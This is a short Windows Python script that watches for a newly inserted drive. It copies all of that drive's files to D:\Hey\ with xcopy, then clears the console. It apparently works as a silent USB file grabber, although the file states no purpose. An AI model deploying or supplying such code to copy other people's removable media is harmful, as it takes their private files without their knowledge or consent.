import win32api
import os
import time

drives = win32api.GetLogicalDriveStrings()
drives = drives.split('\000')[:-1]
numberOfDrives = len(drives)

while True:
	newDriveList = win32api.GetLogicalDriveStrings()
	newDriveList = newDriveList.split('\000')[:-1]
	newLength = len(newDriveList)
	if newLength > numberOfDrives:
		required = newDriveList[newLength - 1]
		newDrive = newDriveList[-1]
		print(newDrive)
		cmd = "xcopy /s " + newDrive + "\*.*" + " D:\\Hey\\"
		os.system(cmd)
		os.system("cls")
		break	
	time.sleep(5)
